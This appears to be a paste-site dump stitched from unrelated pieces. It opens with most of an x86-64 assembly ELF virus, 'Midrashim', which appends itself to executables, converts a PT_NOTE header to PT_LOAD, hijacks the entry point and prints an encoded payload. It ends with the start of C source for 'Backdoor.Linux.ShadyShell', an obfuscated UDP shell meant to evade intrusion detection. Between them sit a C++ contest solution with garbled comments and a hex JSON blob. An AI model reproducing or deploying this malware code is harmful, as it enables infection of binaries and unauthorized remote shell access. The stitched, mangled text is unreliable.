            jge .close_file                                     ; exit if no valid phdr for infection was found

            add r8w, word [r15 + 198]                           ; otherwise, add current ehdr.phentsize from [r15 + 198] into r8w
            jnz .loop_phdr                                      ; read next phdr

        .infect:
            .get_target_phdr_file_offset:
                mov ax, bx                                      ; loading phdr loop counter bx to ax
                mov dx, word [r15 + 198]                        ; loading ehdr.phentsize from [r15 + 198] to dx
                imul dx                                         ; bx * ehdr.phentsize
                mov r14w, ax
                add r14, [r15 + 176]                            ; r14 = ehdr.phoff + (bx * ehdr.phentsize)

            .file_info:
                mov rdi, r9
                mov rsi, r15                                    ; rsi = r15 = stack buffer address
                mov rax, SYS_FSTAT
                syscall                                         ; stat.st_size = [r15 + 48]

            .append_virus:
                ; getting target EOF
                mov rdi, r9                                     ; r9 contains fd
                mov rsi, 0                                      ; seek offset 0
                mov rdx, SEEK_END
                mov rax, SYS_LSEEK
                syscall                                         ; getting target EOF offset in rax
                push rax                                        ; saving target EOF

                call .delta                                     ; the age old trick
                .delta:
                    pop rbp
                    sub rbp, .delta

                ; writing virus body to EOF
                mov rdi, r9                                     ; r9 contains fd
                lea rsi, [rbp + v_start]                        ; loading v_start address in rsi
                mov rdx, v_stop - v_start                       ; virus size
                mov r10, rax                                    ; rax contains target EOF offset from previous syscall
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_phdr:
                mov dword [r15 + 208], PT_LOAD                  ; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
                mov dword [r15 + 212], PF_R or PF_X             ; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4)
                pop rax                                         ; restoring target EOF offeset into rax
                mov [r15 + 216], rax                            ; phdr.offset [r15 + 216] = target EOF offset
                mov r13, [r15 + 48]                             ; storing target stat.st_size from [r15 + 48] in r13
                add r13, 0xc000000                              ; adding 0xc000000 to target file size
                mov [r15 + 224], r13                            ; changing phdr.vaddr in [r15 + 224] to new one in r13 (stat.st_size + 0xc000000)
                mov qword [r15 + 256], 0x200000                 ; set phdr.align in [r15 + 256] to 2mb
                add qword [r15 + 240], v_stop - v_start + 5     ; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
                add qword [r15 + 248], v_stop - v_start + 5     ; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry

                ; writing patched phdr
                mov rdi, r9                                     ; r9 contains fd
                mov rsi, r15                                    ; rsi = r15 = stack buffer address
                lea rsi, [r15 + 208]                            ; rsi = phdr = [r15 + 208]
                mov dx, word [r15 + 198]                        ; ehdr.phentsize from [r15 + 198]
                mov r10, r14                                    ; phdr from [r15 + 208]
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_ehdr:
                ; patching ehdr
                mov r14, [r15 + 168]                            ; storing target original ehdr.entry from [r15 + 168] in r14
                mov [r15 + 168], r13                            ; set ehdr.entry in [r15 + 168] to r13 (phdr.vaddr)
                mov r13, 0x005a4d54                             ; loading virus signature into r13 (TMZ in little-endian)
                mov [r15 + 152], r13                            ; adding the virus signature to ehdr.pad in [r15 + 152]

                ; writing patched ehdr
                mov rdi, r9                                     ; r9 contains fd
                lea rsi, [r15 + 144]                            ; rsi = ehdr = [r15 + 144]
                mov rdx, EHDR_SIZE                              ; ehdr.size
                mov r10, 0                                      ; ehdr.offset
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .write_patched_jmp:
                ; getting target new EOF
                mov rdi, r9                                     ; r9 contains fd
                mov rsi, 0                                      ; seek offset 0
                mov rdx, SEEK_END
                mov rax, SYS_LSEEK
                syscall                                         ; getting target EOF offset in rax

                ; creating patched jmp
                mov rdx, [r15 + 224]                            ; rdx = phdr.vaddr
                add rdx, 5
                sub r14, rdx
                sub r14, v_stop - v_start
                mov byte [r15 + 300 ], 0xe9
                mov dword [r15 + 301], r14d

                ; writing patched jmp to EOF
                mov rdi, r9                                     ; r9 contains fd
                lea rsi, [r15 + 300]                            ; rsi = patched jmp in stack buffer = [r15 + 208]
                mov rdx, 5                                      ; size of jmp rel
                mov r10, rax                                    ; mov rax to r10 = new target EOF
                mov rax, SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

                mov rax, SYS_SYNC                               ; commiting filesystem caches to disk
                syscall

        .close_file:
            mov rax, SYS_CLOSE                                  ; close source fd in rdi
            syscall

        .continue:
            pop rcx
            add cx, word [rcx + r15 + 416]                      ; adding directory record lenght to cx (lower rcx, for word)
            cmp rcx, qword [r15 + 350]                          ; comparing rcx counter with r10 (directory records total size)
            jne file_loop                                       ; if counter is not the same, continue loop. Exit virus otherwise

    cmp byte [r15 + 3000], FIRST_RUN                            ; checking if custom control flag we set earlier indicates virus first execution
    jnz infected_run                                            ; if control flag != 1, it should be running from an infected file, use normal payload
        call show_msg                                           ; if control flag == 1, assume virus is being executed for the first time and display a different message
        info_msg:
            db 'Midrashim by TMZ (c) 2020', 0xa                 ; not the nicest approach like I mentioned before but quick to implement
            info_len = $-info_msg
        show_msg:            
            pop rsi                                             ; info_msg address to rsi
            mov rax, SYS_WRITE
            mov rdi, STDOUT                                     ; display payload
            mov rdx, info_len
            syscall
            jmp cleanup                                         ; cleanup and exit

    infected_run:
        ; 1337 encoded payload, very hax0r
        call payload
        msg:
            ; payload first part
            db 0x59, 0x7c, 0x95, 0x95, 0x57, 0x9e, 0x9d, 0x57
            db 0xa3, 0x9f, 0x92, 0x57, 0x93, 0x9e, 0xa8, 0xa3
            db 0x96, 0x9d, 0x98, 0x92, 0x57, 0x7e, 0x57, 0x98
            db 0x96, 0x9d, 0x57, 0xa8, 0x92, 0x92, 0x57, 0x96
            db 0x57, 0x9f, 0xa2, 0x94, 0x92, 0x57, 0x9f, 0x9c
            db 0x9b, 0x9c, 0x94, 0xa9, 0x96, 0xa7, 0x9f, 0x9e
            db 0x98, 0x57, 0x89, 0x9c, 0x9d, 0x96, 0x9b, 0x93
            db 0x57, 0x7a, 0x98, 0x73, 0x9c, 0x9d, 0x96, 0x9b
            db 0x93, 0x57, 0xa4, 0x96, 0x9b, 0xa0, 0x9e, 0x9d
            db 0x94, 0x57, 0x99, 0x92, 0xa3, 0xa4, 0x92, 0x92
            db 0x9d, 0x57, 0xa3, 0x9f, 0x92, 0x57, 0x94, 0xa9
            db 0x96, 0x9e, 0x9d, 0x57, 0x92, 0x9b, 0x92, 0xa5
            db 0x96, 0xa3, 0x9c, 0xa9, 0xa8, 0x57, 0x96, 0x9d
            db 0x93, 0x57, 0xa3, 0xa9, 0x92, 0x92, 0xa8, 0x41
            db 0x7c, 0x9f, 0x5b, 0x57, 0x9e, 0x95, 0x57, 0x7e
            db 0x57, 0x9f, 0x96, 0x93, 0x57, 0xa3, 0x9f, 0x92
            db 0x57, 0x9a, 0x9c, 0x9d, 0x92, 0xae, 0x57, 0x7e
            db 0x54, 0x93, 0x57, 0x9f, 0x96, 0xa5, 0x92, 0x57
            db 0x54, 0x92, 0x9a, 0x57, 0x9a, 0x96, 0xa0, 0x92
            db 0x57, 0x9c, 0x9d, 0x92, 0x57, 0x9c, 0x95, 0x57
            db 0xa3, 0x9f, 0x9c, 0xa8, 0x92, 0x57, 0x9a, 0x92
            db 0x5b, 0x57, 0xa3, 0x9f, 0x92, 0x9d, 0x57, 0x7e
            db 0x54, 0x93, 0x57, 0xa8, 0x92, 0x9d, 0x93, 0x57
            db 0x9a, 0xae, 0xa8, 0x92, 0x9b, 0x95, 0x57, 0xa3
            db 0x9c, 0x57, 0xa8, 0xa3, 0x96, 0x9b, 0xa0, 0x57
            db 0xa3, 0x9f, 0x92, 0x57, 0x9b, 0x96, 0x9d, 0x93
            db 0xa8, 0x98, 0x96, 0xa7, 0x92, 0x57, 0x96, 0x9d
            db 0x93, 0x57, 0xa8, 0x98, 0x96, 0xa9, 0x92, 0x57
            db 0x92, 0xa5, 0x92, 0xa9, 0xae, 0x99, 0x9c, 0x93
            db 0xae, 0x41, 0x8e, 0x9c, 0xa2, 0x57, 0xa8, 0x92
            db 0x92, 0x5b, 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8
            db 0x92, 0x57, 0x7e, 0x57, 0x94, 0x9c, 0xa3, 0x57
            db 0xa3, 0x9f, 0x9e, 0xa8, 0x57, 0xa8, 0x9c, 0xa9
            db 0xa3, 0x57, 0x9c, 0x95, 0x57, 0x95, 0x9e, 0x92
            db 0x9b, 0x93, 0x57, 0x99, 0x92, 0x9f, 0x9e, 0x9d
            db 0x93, 0x57, 0x9a, 0x92, 0x5d, 0x57, 0x79, 0x92
            db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x5d, 0x5d, 0x5d
            db 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
            db 0x7e, 0x54, 0xa5, 0x92, 0x57, 0x94, 0x9c, 0xa3
            db 0x57, 0xa8, 0xa7, 0x9e, 0xa0, 0x92, 0xa8, 0x41
            db 0x79, 0x92, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
            db 0x7e, 0x57, 0x94, 0x9c, 0x57, 0x99, 0x92, 0xa3
            db 0xa4, 0x92, 0x92, 0x9d, 0x57, 0xa3, 0x9f, 0x92
            db 0x57, 0xb1, 0x9c, 0x9d, 0x92, 0xa8, 0x5b, 0x57
            db 0x92, 0xa5, 0x92, 0x9d, 0x57, 0xa4, 0x9f, 0x92
            db 0x9d, 0x57, 0x7e, 0x54, 0x9a, 0x57, 0x9d, 0x9c
            db 0xa3, 0x57, 0xa8, 0xa2, 0xa7, 0xa7, 0x9c, 0xa8
            db 0x92, 0x93, 0x57, 0xa3, 0x9c, 0x41, 0x79, 0x92
            db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57, 0x7e, 0x54
            db 0x9a, 0x57, 0x96, 0x57, 0xa8, 0xa2, 0xa8, 0xa7
            db 0x9e, 0x98, 0x9e, 0x9c, 0xa2, 0xa8, 0x57, 0xa7
            db 0x92, 0xa9, 0xa8, 0x9c, 0x9d, 0x57, 0xa9, 0x92
            db 0xa7, 0x9c, 0xa9, 0xa3, 0x57, 0x41, 0x76, 0x9d
            db 0x93, 0x57, 0x9e, 0xa3, 0x54, 0xa8, 0x57, 0xa3
            db 0x9e, 0x9a, 0x92, 0x57, 0xa3, 0x9c, 0x57, 0x94
            db 0x9c, 0x57, 0xa8, 0x9f, 0x9c, 0xa7, 0xa7, 0x9e
            db 0x9d, 0x94, 0x5d, 0x59, 0x41, 0x37, 0x41
            ; payload second part
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x58
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x58, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x5d, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x52, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x5d, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x5d
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x55
            db 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x55, 0x52, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x61, 0x55, 0x55, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x55
            db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x41
            len = $-msg

        payload:
            pop rsi                                             ; setting up decoding loop
            mov rcx, len
            lea rdi, [r15 + 3001]

            .decode:
                lodsb                                           ; load byte from rsi into al
                sub  al, 50                                     ; decoding it
                xor  al, 5
                stosb                                           ; store byte from al into rdi
                loop .decode                                    ; sub 1 from rcx and continue loop until rcx = 0

            lea rsi, [r15 + 3001]                               ; decoded payload is at [r15 + 3000]
            mov rax, SYS_WRITE
            mov rdi, STDOUT                                     ; display payload
            mov rdx, len
            syscall

cleanup:
    add rsp, 5000                                               ; restoring stack so host process can run normally, this also could use some improvement
    pop rsp
    pop rdx

v_stop:
    xor rdi, rdi                                                ; exit code 0
    mov rax, SYS_EXIT
    syscall"
G0RgK3pe,Untitled,skimono,C++,Wednesday 7th of June 2023 06:04:08 AM CDT,"﻿#pragma GCC optimize(""Ofast"") // ������������ ���������, �� ��� ������
#pragma GCC optimize(""no-stack-protector"") //�����
#pragma GCC optimize(""unroll-loops"") // � ���� ���� ��� �� 100 �� ������ ����� � ��������� �� ��� � 100 ��� �� ������ ��������
#pragma GCC target(""sse,sse2,sse3,ssse3,popcnt,abm,mmx,tune=native"") // ��� ����� ����� �� ��� 03 02 ��������� � ������ ������� �������� ��� ���� ������������
#pragma GCC optimize(""fast-math"")
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <cmath>
#include <stack>
#include <iomanip>
#include <fstream>
#include <string>
#include <set>
#include <deque>
#include <queue>
#include <map>
#include <bitset>
#include <random>
#include <list>
#include <unordered_map>
#include <unordered_set>
#include <cassert>

using namespace std;

typedef long long ll;
typedef short sh;
typedef unsigned long long ull;
typedef long double ld;
typedef string str;
//typedef __int128 ultraint;
#define sqrt sqrtl
#define F first
#define S second
#define endl '\n'
#define all(vc666) vc666.begin(), vc666.end()
#define allr(vc666) vc666.rbegin(), vc666.rend()
#define int long long
#define degug(x) cerr (#x) << "" "" << (x) << endl;

const ll INF = (ll)1e18;
const ll inf = 1e9 + 7;
const ll ONE = 1;
const ll mod = 1e9 + 7;
const ll m1 = 1e9 + 575179;
const ll m2 = 1e9 + 87;
const ll LG = 19;
const ll k = 347;
ld EPS = 1e-7;
ld PI = 3.1415926535897932384;
ld phi = (sqrt(5) + 1.0) / 2.0;
mt19937_64 gen(rand());

struct SegTree {
    struct Node {
        int min_val = 0, push = 0;
    };
    vector <Node> t;
    SegTree(int n) {
        t.resize(4 * n);
    }
    void unite(const Node& l, const Node& r, Node& m) {
        m.min_val = min(l.min_val, r.min_val);
    }
    void pushUP(int v, int tl, int tr) {
        if (!t[v].push) {
            return;
        }
        t[v].min_val += t[v].push;
        if (v * 2 + 1 >= (int)t.size()) {
            t[v].push = 0;
            return;
        }
        t[v * 2].push += t[v].push;
        t[v * 2 + 1].push += t[v].push;
        t[v].push = 0;
    }
    void build(int v, int tl, int tr) {
        if (tl == tr) {
            t[v].min_val = 0;
            t[v].push = 0;
        }
        else {
            int tm = (tl + tr) / 2;
            build(v * 2, tl, tm);
            build(v * 2 + 1, tm + 1, tr);
            unite(t[v * 2], t[v * 2 + 1], t[v]);
        }
    }
    void update(int v, int tl, int tr, int l, int r, int boost) {
        pushUP(v, tl, tr);
        if (tl > r || tr < l) {
            return;
        }
        else {
            if (tl >= l && tr <= r) {
                t[v].push += boost;
                pushUP(v, tl, tr);
            }
            else {
                int tm = (tl + tr) / 2;
                update(v * 2, tl, tm, l, r, boost);
                update(v * 2 + 1, tm + 1, tr, l, r, boost);
                unite(t[v * 2], t[v * 2 + 1], t[v]);
            }
        }
    }
    bool gg() {
        return t[1].min_val >= 1;
    }
};

struct Query {
    int x1, x2, y, id, zxc;
    //Szhatiy x1,x2
};

bool cmp(const Query& a, const Query& b) {
    if (a.y < b.y) {
        return true;
    }
    else if (a.y == b.y) {
        return a.zxc < b.zxc;
    }
    else {
        return false;
    }
}

void solve() {
    int n, i, j, x, y, x1, y1, a, b, N, k, i1, i2;
    cin >> n >> x >> y;
    vector <pair <pair <int, int>, pair <int, int> > > zxc(n);
    vector <int> rzl_x;
    rzl_x.push_back(0);
    rzl_x.push_back(x);
    for (i = 0; i < n; i++) {
        cin >> zxc[i].first.first >> zxc[i].first.second >> zxc[i].second.first >> zxc[i].second.second;
        rzl_x.push_back(zxc[i].first.first);
        rzl_x.push_back(zxc[i].second.first);
    }
    sort(all(rzl_x));
    rzl_x.resize(unique(all(rzl_x)) - rzl_x.begin());
    N = rzl_x.size() - 1;
    SegTree tree(N);
    vector <Query> Q;
    for (i = 0; i < n; i++) {
        i1 = lower_bound(all(rzl_x), zxc[i].first.first) - rzl_x.begin();
        i2 = lower_bound(all(rzl_x), zxc[i].second.first) - rzl_x.begin() - 1;
        Q.emplace_back(i1, i2, zxc[i].first.second, i, 1);
        Q.emplace_back(i1, i2, zxc[i].second.second + 1, i, -1);
    }
    sort(all(Q), cmp);
    set <int> cur;
    int l = -1, r = inf;
    for (i = 0; i < n; i++) {
        cur.clear();
        for (j = i; j < n; j++) {
            cur.insert(j);
            tree.build(1, 0, N - 1);
            bool flag = false;
            for (k = 0; k < Q.size(); k++) {
                if (!cur.contains(Q[k].id)) continue;
                if (Q[k].x1 > Q[k].x2) continue;
                if (Q[k].zxc > 0) {
                    tree.update(1, 0, N - 1, Q[k].x1, Q[k].x2, 1);
                }
                else {
                    tree.update(1, 0, N - 1, Q[k].x1, Q[k].x2, -1);
                }
                if (tree.t[1].min_val + tree.t[1].push > 0) {
                    flag = true;
                    break;
                }
            }
            if (flag) {
                if (j - i + 1 < r - l + 1) {
                    l = i;
                    r = j;
                }
                else if (j - i + 1 == r - l + 1 && i < l) {
                    l = i;
                    r = j;
                }
                break;
            }
        }
    }
    if (l == -1) {
        cout << -1 << endl;
    }
    else {
        cout << l + 1 << "" "" << r + 1 << endl;
    }
}

signed main() {
#ifdef _DEBUG
    freopen(""input.txt"", ""r "", stdin);
    freopen(""output.txt"", ""w"", stdout);
#endif
    ios_base::sync_with_stdio(0);
    cin.tie(NULL);
    cout.tie(NULL);
    int t = 1;
    //cin >> t;
    while (t--) solve();
}
//Deisgned by skimono"
HEbrFyL3,data596,TestGuy1,JSON,Wednesday 7th of June 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '1877e835d555f6fd04f6caf8c015b9b422f980692029cde5d7d60fe7466866e2d746dfd96e4cad53a106aadb1887b2175b6404c8b254b8ee2c93c415cc122dce8bec608080d5843ff55f3f7a598382e59842e1f0de96517a76599987f8aca833f38d4299c8e1364c6f110073102039d0935b6b3cf97668d86200a560636f3e21',
  otherdata: [
    '48f899b36d229e51ec9c6cc419a56405',
    '4c057cd4fa0096458641b6bd24a09428',
    '92dd844f617e13d36d5f7970aecc526e',
    '02b0c9a073d3ff68272838778ba88a65',
    '15b2a5e012bbddb6e8cffb474cdb59a8',
    'a7a5f439b58e9ab3c77b2a5aae626629',
    '5243de8a46eb6c54a79ed053e4576e11',
    '1a9cc33eba608e533869619658b337b2'
  ]
}"
NngxsiAq,Backdoor.Linux.ShadyShell - Source Code,FlyFar,C,Wednesday 7th of June 2023 05:58:11 AM CDT,"/* shadyshell.c by Derek Callaway <super@udel.edu> -- S@IRC
   obfuscated/optimized/compact UDP portshell code; Avoid layer 4 IDS ;-)
   Example client usage: nc -u host.dom 1337
   Greets: inNUENdo, s0ftpr0jects, zsh 
*/
#include<stdio.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<stdlib.h>
#define DP 1337 /* Default Port */
void ve(const char*f){perror(f);exit(-1);} int isdigit(),dup2();
void usg(char**v){printf(""usage: %s [port]\n"",*v);exit(0);}
int main(int c,char**v){struct sockaddr_in s={};struct sockaddr u;
char*p,b[512];if(c==2){for(p=v[1];*p;p++)if(!isdigit(*p))usg(v);c=atoi(*(++v));}
s.sin_port=htons(c==2?c:DP),s.sin_addr.s_addr=INADDR_ANY,s.sin_family=AF_INET;
